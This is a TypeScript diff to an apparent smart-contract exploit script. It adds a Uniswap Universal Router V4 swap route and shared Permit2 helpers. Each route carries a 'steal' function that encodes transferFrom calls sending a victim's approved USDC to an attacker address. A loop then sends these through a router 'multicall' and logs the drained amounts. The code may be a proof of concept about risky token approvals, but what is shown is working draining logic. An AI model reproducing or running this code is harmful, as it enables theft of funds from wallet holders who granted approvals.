@@ -2,6 +2,7 @@ import { encodeAbiParameters, encodeFunctionData, formatEther, maxUint256, parse
 import {
   CMD,
   MSG_SENDER,
+  V4,
   PERMIT2,
   compile,
   encodeUr,
@@ -39,6 +40,32 @@ type Route = {
   exposure: (who: Address) => Promise<string>
   steal: (victim: Address, amt: bigint) => { target: Address; data: Hex }
 }
+
+const permit2Exposure = async (who: Address) => {
+  const [toP2, [p2Amount]] = await Promise.all([
+    pub.readContract({ address: d.usdc, abi: erc20Abi, functionName: 'allowance', args: [who, PERMIT2] }),
+    pub.readContract({ address: PERMIT2, abi: permit2Abi, functionName: 'allowance', args: [who, d.usdc, d.ur] }),
+  ])
+  return toP2 === 0n && p2Amount === 0n ? 'nothing' : `token->Permit2 ${toP2 === maxUint256 ? 'unlimited' : formatEther(toP2)}, Permit2->router ${p2Amount === (1n << 160n) - 1n ? 'unlimited' : formatEther(p2Amount)}`
+}
+const permit2Steal = (v: Address, amt: bigint) => ({
+  target: PERMIT2 as Address,
+  data: encodeFunctionData({ abi: parseAbi(['function transferFrom(address from, address to, uint160 amount, address token)']), functionName: 'transferFrom', args: [v, attacker, amt, d.usdc] }),
+})
+const permit2Grants = (): Call[] => [
+  approve(PERMIT2),
+  { to: PERMIT2, data: encodeFunctionData({ abi: permit2Abi, functionName: 'approve', args: [d.usdc, d.ur, (1n << 160n) - 1n, 2 ** 48 - 1] }) },
+]
+const v4Plan = encodeAbiParameters(parseAbiParameters('bytes, bytes[]'), [
+  `0x${[V4.SWAP_EXACT_IN_SINGLE, V4.SETTLE_ALL, V4.TAKE_ALL].map((x) => x.toString(16).padStart(2, '0')).join('')}`,
+  [
+    encodeAbiParameters(parseAbiParameters('((address, address, uint24, int24, address), bool, uint128, uint128, bytes)'), [
+      [[d.poolKey.currency0, d.poolKey.currency1, 3000, 60, d.poolKey.hooks], d.usdc === d.poolKey.currency0, amount, 1n, '0x'],
+    ]),
+    encodeAbiParameters(parseAbiParameters('address, uint256'), [d.usdc, amount]),
+    encodeAbiParameters(parseAbiParameters('address, uint256'), [d.weth, 1n]),
+  ],
+])
 
 const routerAllowance = (router: Address) => async (who: Address) => {
   const a = await pub.readContract({ address: d.usdc, abi: erc20Abi, functionName: 'allowance', args: [who, router] })
@@ -83,11 +110,10 @@ const routes: Route[] = [
     steal: (v, amt) => ({ target: d.usdc, data: pull(v, amt) }),
   },
   {
-    name: 'Universal Router, Permit2 two-layer approval',
+    name: 'Universal Router V3 swap, Permit2 two-layer approval',
     router: d.ur,
     request: () => [
-      approve(PERMIT2),
-      { to: PERMIT2, data: encodeFunctionData({ abi: permit2Abi, functionName: 'approve', args: [d.usdc, d.ur, (1n << 160n) - 1n, 2 ** 48 - 1] }) },
+      ...permit2Grants(),
       {
         to: d.ur,
         data: encodeUr({
@@ -97,17 +123,15 @@ const routes: Route[] = [
         }),
       },
     ],
-    exposure: async (who) => {
-      const [toP2, [p2Amount]] = await Promise.all([
-        pub.readContract({ address: d.usdc, abi: erc20Abi, functionName: 'allowance', args: [who, PERMIT2] }),
-        pub.readContract({ address: PERMIT2, abi: permit2Abi, functionName: 'allowance', args: [who, d.usdc, d.ur] }),
-      ])
-      return toP2 === 0n && p2Amount === 0n ? 'nothing' : `token->Permit2 ${toP2 === maxUint256 ? 'unlimited' : formatEther(toP2)}, Permit2->router ${p2Amount === (1n << 160n) - 1n ? 'unlimited' : formatEther(p2Amount)}`
-    },
-    steal: (v, amt) => ({
-      target: PERMIT2,
-      data: encodeFunctionData({ abi: parseAbi(['function transferFrom(address from, address to, uint160 amount, address token)']), functionName: 'transferFrom', args: [v, attacker, amt, d.usdc] }),
-    }),
+    exposure: permit2Exposure,
+    steal: permit2Steal,
+  },
+  {
+    name: 'Universal Router V4_SWAP (SWAP_EXACT_IN_SINGLE, SETTLE_ALL, TAKE_ALL), Permit2',
+    router: d.ur,
+    request: () => [...permit2Grants(), { to: d.ur, data: encodeUr({ commands: [CMD.V4_SWAP], inputs: [v4Plan], deadline }) }],
+    exposure: permit2Exposure,
+    steal: permit2Steal,
   },
 ]
 
@@ -152,7 +176,7 @@ for (const route of routes) {
       continue
     }
     const hash = await w.writeContract({ address: route.router, abi: exploitAbi, functionName: 'multicall', args: [s.target, s.data], gas: 250_000n })
-    await pub.waitForTransactionReceipt({ hash })
+    await pub.waitForTransactionReceipt({ timeout: 600_000, hash })
     console.log(`   exploit vs ${name}: drained ${formatEther(bal)} USDC  tx ${hash}`)
   }
 }
